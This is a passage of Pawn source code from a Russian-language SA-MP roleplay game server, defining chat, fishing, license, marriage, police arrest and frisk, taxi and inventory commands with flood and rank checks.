	AntiReklama(playerid,params[1],"do");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(gettime() < (GetPVarInt(playerid, "SendDo") + 30))
    {
		if(GetPVarInt(playerid, "SendDoTimes") >= 3)
		{
			return SCM(playerid, COLOR_GREY, " Эту команду можно использовать не более 3 раз в 30 секунд");
		}
    }
	else SetPVarInt(playerid, "SendDoTimes", 0);
	if(PlayerInfo[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(sscanf(params, "s[64]", params[0])) return SCM(playerid, -1, " Введите: /do [действие]");
	format(YCMDstr, 144, " {FFFFFF}(( %s[%i] )) {FF8000}%s",PlayerInfo[playerid][pName],playerid, params[0]);
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPlayerChatBubble(playerid,params[0],0xFF9900AA,30.0,10000);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	SetPVarInt(playerid, "SendDoTimes", GetPVarInt(playerid, "SendDoTimes")+1);
	SetPVarInt(playerid, "SendDo", gettime());
	return true;
}
CMD:try(playerid, params[])
{
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	AntiReklama(playerid,params[1],"try");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(gettime() < (GetPVarInt(playerid, "SendTry") + 30))
    {
		if(GetPVarInt(playerid, "SendTryTimes") >= 3)
		{
			return SCM(playerid, COLOR_GREY, " Эту команду можно использовать не более 3 раз в 30 секунд");
		}
    }
	else SetPVarInt(playerid, "SendTryTimes", 0);
	if(PlayerInfo[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(sscanf(params, "s[64]", params[0])) return SCM(playerid, -1, " Введите: /try [действие]");
	new randomchik = Random(0,2);
	format(YCMDstr, sizeof(YCMDstr), " %s %s %s",Name(playerid),params[0],(!randomchik)?("{00AB06} [Удачно]") : ("{C42100} [Неудачно]"));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPlayerChatBubble(playerid,params[0],COLOR_PURPLE,30.0,10000);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	SetPVarInt(playerid, "SendTryTimes", GetPVarInt(playerid, "SendTryTimes")+1);
	SetPVarInt(playerid, "SendTry", gettime());
	return true;
}
CMD:todo(playerid, params[])
{
    new data_temp_text_todo[128], data_temp_string[54], data_player_name[24];
	GetPlayerName(playerid, data_player_name, 24);
    if(sscanf(params, "s[128]", data_temp_text_todo)) return SendClientMessage(playerid, -1, " Введите: /todo [Фраза*Действие]");
    if(strfind(data_temp_text_todo, "*") == -1) return SendClientMessage(playerid, -1, " Введите: /todo [Фраза*Действие]");
    format(data_temp_string, sizeof(data_temp_string), "', {C2A2DA}- сказал %s, ", data_player_name);
    new data_of_token = strfind(data_temp_text_todo, "*");
    strdel(data_temp_text_todo, strfind(data_temp_text_todo, "*"), strfind(data_temp_text_todo, "*")+1);
    strins(data_temp_text_todo, data_temp_string, data_of_token);
    strins(data_temp_text_todo, "'", 0);
    SetPlayerChatBubble(playerid, data_temp_text_todo, 0x6495EDFF, 20.0, 10000);
    ProxDetector(20.0, playerid, data_temp_text_todo, 0xE6E6E6E6,0xC8C8C8C8,0xAAAAAAAA,0x8C8C8C8C,0x6E6E6E6E);
    return 1;
}
CMD:shout(playerid, params[])
{
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	AntiReklama(playerid,params[1],"крикнул");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(PlayerInfo[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(sscanf(params, "s[64]", params[0])) return SCM(playerid, -1, " Введите: (/s)hout [текст]");
	format(YCMDstr, sizeof(YCMDstr), " %s крикнул: %s!!",Name(playerid),params[0]);
	ProxDetector(60.0, playerid, YCMDstr,-1,-1,-1,COLOR_FADE1,COLOR_FADE2);
	Flood[playerid] = 1;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) ApplyAnimation(playerid, "RIOT", "RIOT_shout", 2000.0, 0, 1, 1, 1, 1, 1), SetTimerEx("ClearAnim", 800, false, "d", playerid);
	SetPlayerChatBubble(playerid,params[0],COLOR_YELLOW,60.0,10000);
	SetPVarInt(playerid,"Flood",0);
	return true;
}
CMD:fish(playerid, params[])
{
	ShowPlayerDialogEx(playerid,1342,DIALOG_STYLE_LIST, "Рыбалка","Начать / Закончить рыбалку\nНакопать червей\nПриготовить рыбу\nСъесть рыбу\nПродать рыбу\nИнформация\nПомощь", "Выбор", "Выход");
	return true;
}
CMD:quest(playerid, params[])
{
	ShowPlayerDialogEx(playerid,1343,DIALOG_STYLE_LIST, "Управление квестами","Текущий квест\nВыбор сюжетной линии [Временно не работает]\nСтатистика\nЧужая статистика", "Далее", "Выход");
	return true;
}
CMD:licenses(playerid)
{
	SCM(playerid, 0x59bd3aa, "-----------===[ LICENSES ]===-----------");
	format(YCMDstr, sizeof(YCMDstr), " Водительские права:  %s",(!PlayerInfo[playerid][pCarLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия пилота:  %s",(!PlayerInfo[playerid][pFlyLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия на катера:  %s",(!PlayerInfo[playerid][pBoatLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия рыболова:  %s",(!PlayerInfo[playerid][pFishLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия на оружие:  %s",(!PlayerInfo[playerid][pGunLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
	SCM(playerid, 0x59bd3aa, "=============================");
	return true;
}
CMD:showlicenses(playerid, params[])
{
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /showlicenses [playerid]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid,COLOR_GREY, " Игрок оффлайн");
	if(params[0] == playerid) return SCM(playerid,COLOR_GREY, " Чтобы посмотреть лицензии введите /licenses");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	format(YCMDstr, sizeof(YCMDstr), "-----------===[ LICENSES %s ]===-----------", Name(playerid));
	SCM(params[0], 0x59bd3aa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Водительские права:  %s",(!PlayerInfo[playerid][pCarLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия пилота:  %s",(!PlayerInfo[playerid][pFlyLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия на катера:  %s",(!PlayerInfo[playerid][pBoatLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия рыболова:  %s",(!PlayerInfo[playerid][pFishLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия на оружие:  %s",(!PlayerInfo[playerid][pGunLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	SCM(playerid, 0x59bd3aa, "=============================");
	SendMes(playerid, COLOR_BLUE, " Вы показали свои лицензии %s", Name(params[0]));
	format(YCMDstr,sizeof(YCMDstr), " %s показал свои лицензии %s'у",Name(playerid),Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	format(YCMDstr,sizeof(YCMDstr), "Показал свои лицензии %s'у",Name(params[0]));
	SetPlayerChatBubble(playerid,YCMDstr,COLOR_PURPLE,30.0,10000);
	return true;
}
CMD:divorce(playerid, params[])
{
	SCM(playerid, 0x6ab1ffaa, " У вас больше нет жены / мужа");
	ClearMarriage(playerid);
	return true;
}
CMD:propose(playerid, params[])
{
	if(PlayerInfo[playerid][pCash] < 100000) return SCM(playerid, COLOR_GREY, " Вам нужно 100 000 на свадьбу!");
	if(strcmp(PlayerInfo[playerid][pMarriedTo],"-",true) != 0) return SCM(playerid, COLOR_GREY, " Вы уже женаты/замужем!");
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /propose [playerid]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
	if(strcmp(PlayerInfo[params[0]][pMarriedTo],"-",true) != 0) return SCM(playerid, COLOR_GREY, " Человек уже состоит в браке!");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid, COLOR_GREY, " Необходимо находиться рядом друг с другом!");
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Вы не можете жениться/выйти замуж на самом себе!"); return true; }
	format(YCMDstr, sizeof(YCMDstr), "{0289CC} Вы предложили выйти замуж / пожениться %s",Name(params[0]));
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает вам руку и сердце. (( Введите: /accept marriage, чтобы принять )).",Name(playerid));
	SCM(params[0], COLOR_BLUE, YCMDstr);
	ProposeOffer[params[0]] = playerid;
	return true;
}
CMD:suspect(playerid, params[])
{
	new reason[32];
	if (GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pLeader] == 1
	||GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pLeader] == 2
	|| GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pLeader] == 10
	|| GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 21 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pLeader] == 21)
	{
	    if(sscanf(params, "uds[32]", params[0],params[1],reason)) return SCM(playerid, -1, " Введите: (/su)spect [id игрока] [уровень розыска] [причина]");
		if(!IsPlayerConnected(params[0])) return true;
		if(params[0] == INVALID_PLAYER_ID) return true;
		if(PlayerInfo[params[0]][pJailTime] != 0) return SCM(playerid, COLOR_GREY, " Человек находится в камере");
		if(PlayerInfo[params[0]][pWantedLevel] >= 3 && PlayerInfo[playerid][pMember] == 1 && PlayerInfo[playerid][pMember] == 10 && PlayerInfo[playerid][pMember] == 21) return SCM(playerid, COLOR_GREY, " У данного игрока уже 3 уровней розыска!");
		if(PlayerInfo[params[0]][pWantedLevel] >= 6) return SCM(playerid, COLOR_GREY, " У данного игрока уже 6 уровней розыска!");
		if(IsACop(params[0]) && GetPVarInt(params[0], "Fraction_Duty")) return SCM(playerid, COLOR_GRAD2, " Вы не можете давать розыск законникам!");
		PlayerInfo[params[0]][pWantedLevel] +=params[1];
		SetPlayerWantedLevel(params[0],PlayerInfo[params[0]][pWantedLevel]);
		SetPlayerCriminal(params[0],Name(playerid), reason);
		return true;
	}
	else SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	return true;
}
CMD:spawnchange(playerid)
{
	//if(PlayerInfo[playerid][pMember] == 0) return SCM(playerid,COLOR_GREY," Вы должны состоять в организации!");
	if(!HGet(playerid) && !KGet(playerid)) return SCM(playerid,COLOR_GREY," Вы не имеете дома/квартиры!");
	if(PlayerInfo[playerid][pMember] == 19 && PlayerInfo[playerid][pRank] < 2) return true;
	if(PlayerInfo[playerid][pMember] == 3 && PlayerInfo[playerid][pRank] < 2) return true;
	if(!GetPVarInt(playerid, "Fraction_Duty"))
	{
		if(PlayerInfo[playerid][pMember] == 4)
		{
			ShowPlayerDialogEx(playerid, 11052, DIALOG_STYLE_LIST, "Выбор спавна", "[0] Дом\n[1] База фракции 1\t[SFMC]\n[2] База фракции 2\t[ASGH]\n[3] База фракции 3\t[LVMC]\n[4] База фракции 4\t[FCMC]\n[5] База фракции 5\t[CGH]", "Выбор", "Отмена");
		}
		else ShowPlayerDialogEx(playerid, 11052, DIALOG_STYLE_LIST, "Выбор спавна", "[0] Дом\n[1] База фракции", "Выбор", "Отмена");
	}
	else ShowPlayerDialogEx(playerid, 11052, DIALOG_STYLE_LIST, "Выбор спавна", "[0] Дом\n[1] Вокзал", "Выбор", "Отмена");
	//if(PlayerInfo[playerid][pSpawnChange] == 1) PlayerInfo[playerid][pSpawnChange] = 0, SCM(playerid, -1, " Теперь вы будете возраждаться на базе организации!");
	//else SCM(playerid, -1, " Теперь вы будете возраждаться в обычном месте!"), PlayerInfo[playerid][pSpawnChange] = 1;
	return true;
}
CMD:home(playerid, params[])
{
	if(HGet(playerid))
	{
		SetPlayerCheckpoint(playerid,HouseInfo[PlayerInfo[playerid][pPHouseKey]][hEntrancex], HouseInfo[PlayerInfo[playerid][pPHouseKey]][hEntrancey], HouseInfo[PlayerInfo[playerid][pPHouseKey]][hEntrancez], 4.0);
		SCM(playerid, 0x30a0a7aa, " На радаре отмечено место, где находится ваш дом. Используйте /GPS чтобы убрать метку");
		gPlayerCheckpointStatus[playerid] = 12;
	}
	else if(KGet(playerid))
	{
		new i = PlayerInfo[playerid][pKvartiraKey];
		SetPlayerCheckpoint(playerid,PodeezdInfo[kvartinfo[i][virtmir]][podPicX], PodeezdInfo[kvartinfo[i][virtmir]][podPicY], PodeezdInfo[kvartinfo[i][virtmir]][podPicZ], 4.0);
		format(YCMDstr,sizeof(YCMDstr)," Ваш подъезд обозначен на карте красной меткой. Номер подъезда: %i",kvartinfo[i][virtmir]-1);
		SCM(playerid, 0x30a0a7aa,YCMDstr);
		gPlayerCheckpointStatus[playerid] = 12;
	}
	return true;
}
stock IsInCopCar(playerid)
{
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 596
	&& GetVehicleModel(GetPlayerVehicleID(playerid)) != 597
	&& GetVehicleModel(GetPlayerVehicleID(playerid)) != 598
	&& (GetPlayerVehicleID(playerid) < fbicar[0] || GetPlayerVehicleID(playerid) < fbicar[15])) return false;
	return true;
}
CMD:clear(playerid, params[])
{
	new giveplayerid;
	new sendername[MAX_PLAYER_NAME];
	new giveplayer[MAX_PLAYER_NAME];
	if(!IsInCopCar(playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не в патрульном авто");
	if(sscanf(params, "u", giveplayerid)) return  SCM(playerid, -1, " Введите: /clear [id игрока]");
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID) { } else {SCM(playerid, COLOR_GREY, " [Ошибка] Человек не найден!");}
		{
		    if(PlayerInfo[giveplayerid][pWantedLevel] < 1) return SCM(playerid, COLOR_GREY, " Человек не в розыске");
			GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, 128, " Вы сняли розыск с %s.", giveplayer);
			SCM(playerid, 0x6495EDFF, string);
			format(string, 128, " %s снял с вас розыск.", sendername);
			SCM(giveplayerid, 0x6495EDFF, string);
			PlayerInfo[giveplayerid][pWantedLevel] =0;
			SetPlayerWantedLevel(giveplayerid, 0);
		}
	}
	foreach(i)
	{
		if(GetPVarInt(playerid, "Fraction_Duty") && (PlayerInfo[i][pMember] == 1 ||PlayerInfo[i][pLeader] == 1 || PlayerInfo[i][pMember] == 10 ||PlayerInfo[i][pLeader] == 10 || PlayerInfo[i][pMember] == 2 || PlayerInfo[i][pLeader] == 2 || PlayerInfo[i][pMember] == 21 || PlayerInfo[i][pLeader] == 21))
		{
			format(string, 144, " [Clear] %s удалил из розыскиваемых %s",Name(playerid),Name(giveplayerid));
			SCM(i, 0xffc801c8,string);
		}
	}
	return true;
}
CMD:ticket(playerid, params[])
{
	if(!IsACop(playerid)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(sscanf(params, "uds[54]",params[0],params[1],params[2])) return	SCM(playerid, -1, " Введите: /ticket [id] [цена] [причина]");
	if(params[1] < 1 || params[1] > 10000) { SCM(playerid, COLOR_GREY, " Штраф не должен привышать 10000 и не должен быть меньше 0 вирт!"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	if(GetSRVMoney(params[0]) < params[1]) 	return 	SCM(playerid, COLOR_GRAD1, " У этого  нет столько денег!");
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " [Ошибка] Вы указали свой ID"); return true; }
	format(YCMDstr, sizeof(YCMDstr), " Вы выписали штраф в размере %i вирт %s. Причина: %s",params[1],Name(params[0]),params[2]);
	SCM(playerid, COLOR_BLUE, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Офицер %s выписал вам штраф в размере %i вирт. Причина: %s",Name(playerid),params[1],params[2]);
	SCM(params[0], COLOR_BLUE, YCMDstr);
	SCM(params[0], -1, " (( Введите: /accept ticket, чтобы оплатить штраф ))");
	TicketOffer[params[0]] = playerid;
	TicketMoney[params[0]] = params[1];
	return true;
}
CMD:spveh(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new Float:pos;
	if(sscanf(params, "f",pos)) return SCM(playerid,COLOR_GRAD2, " Введите: /spveh [радиус]");
	new Float:car_x,Float:car_y,Float:car_z;
	for(new cars=0;cars<MAX_VEHICLES;cars++)
	{
		if(GetVehicleModel(cars) > 399)
		{
			GetVehiclePos(cars,car_x,car_y,car_z);
			if(IsPlayerInRangeOfPoint(playerid,pos,car_x,car_y,car_z)) SetVehicleToRespawn(cars);
		}
	}
	return true;
}
CMD:arrest(playerid, params[])
{
	if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 21)
	if(PlayerToPoint(3.0, playerid, 1227.5313,1345.8428,3011.0005))
	{
		if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /arrest [id игрока]");
		if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы указали свой ID");
		if(!IsPlayerConnected(params[0])) return true;
		if(!ProxDetectorS(4.0, playerid, params[0])) return true;
		if(PlayerInfo[params[0]][pWantedLevel] < 1) return  SCM(playerid, COLOR_GREY, " Человек должен иметь хотя бы один уровень розыска!");
		if(PlayerInfo[playerid][pKeys] < 1) return SCM(playerid, COLOR_GREY, " У вас нет ключей от камеры");
		format(YCMDstr, sizeof(YCMDstr), " Вы посадили в тюрьму %s на %d секунд",Name(params[0]),PlayerInfo[params[0]][pWantedLevel]*600);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Вас посадили в тюрьму %s на %d секунд",Name(playerid),PlayerInfo[params[0]][pWantedLevel]*600);
		SCM(params[0], COLOR_BLUE, YCMDstr);
		SCM(params[0],-1," Ваша узнаваемость понизилась");
		PlayerInfo[playerid][pPayCheck]+= 200*PlayerInfo[params[0]][pWantedLevel];
		DelGun(params[0]);
		foreach(i)
		{
			if(GetPVarInt(playerid, "Fraction_Duty") && (PlayerInfo[i][pMember] == 1 ||PlayerInfo[i][pLeader] == 1 || PlayerInfo[i][pMember] == 10 ||PlayerInfo[i][pLeader] == 10 || PlayerInfo[i][pMember] == 2 ||PlayerInfo[i][pLeader] == 2 || PlayerInfo[i][pMember] == 21 || PlayerInfo[i][pLeader] == 21))
			{
				switch(PlayerInfo[playerid][pMember])
				{
					case 1,10,21: format(YCMDstr, sizeof(YCMDstr), " << Офицер %s арестовал %s >>",Name(playerid),Name(params[0])),SCM(i, COLOR_LIGHTRED,YCMDstr);
					case 2: format(YCMDstr, sizeof(YCMDstr), " << Агент FBI %s арестовал %s >>",Name(playerid),Name(params[0])),SCM(i, COLOR_LIGHTRED,YCMDstr);
				}
			}
		}
		new konv = GetPVarInt(playerid, "TempConvoi");
		if(params[0] == konv)
		{
			SetPVarInt(playerid, "TempConvoi", -1);
			Convoi[params[0]] = 9999;
			KillTimer(TimerForPlayer[params[0]]);
			TimerForPlayer[params[0]] = INVALID_PLAYER_ID;
			ClearAnimations(playerid);
			TogglePlayerControllable(params[0], 0);
		}
		SetPlayerSpecialAction(params[0],SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(params[0],0);
		PlayerCuffed[params[0]] = 0;
		PlayerCuffedTime[params[0]] = 0;
		if(PlayerToPoint(6.0, playerid, 268.3327,77.8972,1001.0391))
		{
			switch(random(2))
			{
				case 0:
				{
 			        SetPlayerInterior(params[0], 0);
 			        SetPlayerVirtualWorld(params[0], 1);
			        SetPlayerPos(params[0],1419.8373,1608.7216,1019.6279);
				    SetPlayerFacingAngle(params[0], 92.4315);
				    PlayerInfo[params[0]][pJailTime] = PlayerInfo[params[0]][pWantedLevel]*600;
					PlayerInfo[params[0]][pWantedLevel] = 0;
					PlayerInfo[params[0]][pArrested] += 1;
					PlayerInfo[params[0]][pMestoJail] = 1;
					SetPlayerWantedLevel(params[0], 0);
					TogglePlayerControllable(params[0], 1);
				}
				case 1:
				{
                    SetPlayerInterior(params[0], 0);
                    SetPlayerVirtualWorld(params[0], 1);
			        SetPlayerPos(params[0],1420.0908,1605.4238,1019.6279);
				    SetPlayerFacingAngle(params[0], 89.7681);
				    PlayerInfo[params[0]][pJailTime] = PlayerInfo[params[0]][pWantedLevel]*600;
					PlayerInfo[params[0]][pWantedLevel] = 0;
					PlayerInfo[params[0]][pArrested] += 1;
					PlayerInfo[params[0]][pMestoJail] = 2;
					SetPlayerWantedLevel(params[0], 0);
					TogglePlayerControllable(params[0], 1);
				}
			}
		}
	}
	return true;
}
CMD:fare(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || PlayerInfo[playerid][pJob] != 4) return true;
	if(GetPVarInt(playerid,"TaxiDuty") > 0)
	{
		Delete3DTextLabel(JobText3D[GetPVarInt(playerid,"rentcar_job")]);
		DeletePVar(playerid,"TaxiDuty");
		return true;
	}
	new Veh = GetPlayerVehicleID(playerid);
	if(Veh != GetPVarInt(playerid,"rentcar_job")) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid,COLOR_GREY," Вы должны находиться за рулем автомобиля!");
	if((Veh >= taxicar[0] && Veh <= taxicar[68]) || (Veh >= taxi5lvlcar[0] && Veh <= taxi5lvlcar[9]) || (Veh >= taxi10lvlcar[0] && Veh <= taxi10lvlcar[10]) || (Veh >= taxi40lvlcar[0] && Veh <= taxi40lvlcar[6]))
	{
		SetPVarInt(playerid,"TaxiDuty",Veh);
		JobText3D[Veh] = Create3DTextLabel("<< Бесплатное такси >>", 0xFFFF00FF, 9999.0, 9999.0, 9999.0, 30.0,0,1);
		Attach3DTextLabelToVehicle(JobText3D[Veh], Veh, 0, 0, 1.5);
	}
	return true;
}
CMD:inventory(playerid)
{
	new strs[32];
 	new frisking[512];
 	format(frisking, sizeof(frisking), "Вещи\tКоличество\n");
	if(PlayerInfo[playerid][pDrugs] > 0){
	    format(strs, sizeof(strs), "Наркотики\t%i\n",PlayerInfo[playerid][pDrugs]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[playerid][pMats] > 0){
	    format(strs, sizeof(strs), "Материалы\t%i\n",PlayerInfo[playerid][pMats]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[playerid][pDirectory] == 1){
	    format(strs, sizeof(strs), "Телефонная книга\t%i\n",PlayerInfo[playerid][pDirectory]);
		strcat(frisking, strs, sizeof(frisking));
 	}
    format(strs, sizeof(strs), "CD-Player\t%i\n",1);
	strcat(frisking, strs, sizeof(frisking));
	if(PlayerInfo[playerid][pFishes] > 0.0){
	    format(strs, sizeof(strs), "Рыба\t%f\n",PlayerInfo[playerid][pFishes]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[playerid][pKeys] > 0){
	    format(strs, sizeof(strs), "Ключи от камеры\t%i\n",PlayerInfo[playerid][pKeys]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[playerid][pMushrooms] > 0){
	    format(strs, sizeof(strs), "Грибы\t%i\n",PlayerInfo[playerid][pMushrooms]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[playerid][pCarLic] == 1){
	    format(strs, sizeof(strs), "Водительские права\t%i\n",PlayerInfo[playerid][pCarLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[playerid][pFlyLic] == 1){
	    format(strs, sizeof(strs), "Лицензия пилота\t%i\n",PlayerInfo[playerid][pFlyLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[playerid][pBoatLic] == 1){
	    format(strs, sizeof(strs), "Лицензия на лодки\t%i\n",PlayerInfo[playerid][pBoatLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[playerid][pFishLic] == 1){
	    format(strs, sizeof(strs), "Лицензия на рыболовство\t%i\n",PlayerInfo[playerid][pFishLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[playerid][pGunLic] == 1){
	    format(strs, sizeof(strs), "Лицензия на оружие\t%i\n",PlayerInfo[playerid][pGunLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	new bool:label = false;
	for(new i = 0; i < 46; i++)
		if(Weapons[playerid][i] > 0)
			label = true;
	if(label){
		format(strs, sizeof(strs), "P\tОружие\t%i\n",1);
		strcat(frisking, strs, sizeof(frisking));
	}
	ShowPlayerDialogEx(playerid, 7780, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Информация | {AE433D}Карманы", frisking, "Закрыть", "");
	return true;
}
CMD:frisk(playerid, params[])
{
	if(!IsACop(playerid) || GetPVarInt(playerid, "Fraction_Duty") == 0)
	{
		if(PlayerInfo[playerid][pAdmin] < 4) return SCM(playerid,COLOR_GREY," Вам недоступна эта функция");
	}
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /frisk(/take) [ид игрока]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(3.0, playerid, params[0]) || Spectate[playerid] == 1) return SCM(playerid, COLOR_GREY, " Этот человек далеко от вас");
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете обыскать себя!");
	new strs[32];
 	new frisking[550];
 	format(frisking, sizeof(frisking), "Вещи\tКоличество\n");
	if(PlayerInfo[params[0]][pDrugs] > 0){
	    format(strs, sizeof(strs), "A\tНаркотики\t%i\n",PlayerInfo[params[0]][pDrugs]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[params[0]][pMats] > 0){
	    format(strs, sizeof(strs), "Материалы\t%i\n",PlayerInfo[params[0]][pMats]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[params[0]][pDirectory] == 1){
	    format(strs, sizeof(strs), "Телефонная книга\t%i\n",PlayerInfo[params[0]][pDirectory]);
		strcat(frisking, strs, sizeof(frisking));
 	}
    format(strs, sizeof(strs), "CD-Player\t%i\n",1);
	strcat(frisking, strs, sizeof(frisking));
	if(PlayerInfo[params[0]][pFishes] > 0.0){
	    format(strs, sizeof(strs), "Рыба\t%f\n",PlayerInfo[params[0]][pFishes]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[params[0]][pKeys] > 0){
	    format(strs, sizeof(strs), "Ключи от камеры\t%i\n",PlayerInfo[params[0]][pKeys]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[params[0]][pMushrooms] > 0){
	    format(strs, sizeof(strs), "Грибы\t%i\n",PlayerInfo[params[0]][pMushrooms]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[params[0]][pCarLic] == 1){
	    format(strs, sizeof(strs), "Водительские права\t%i\n",PlayerInfo[params[0]][pCarLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[params[0]][pFlyLic] == 1){
	    format(strs, sizeof(strs), "Лицензия пилота\t%i\n",PlayerInfo[params[0]][pFlyLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PlayerInfo[params[0]][pBoatLic] == 1){
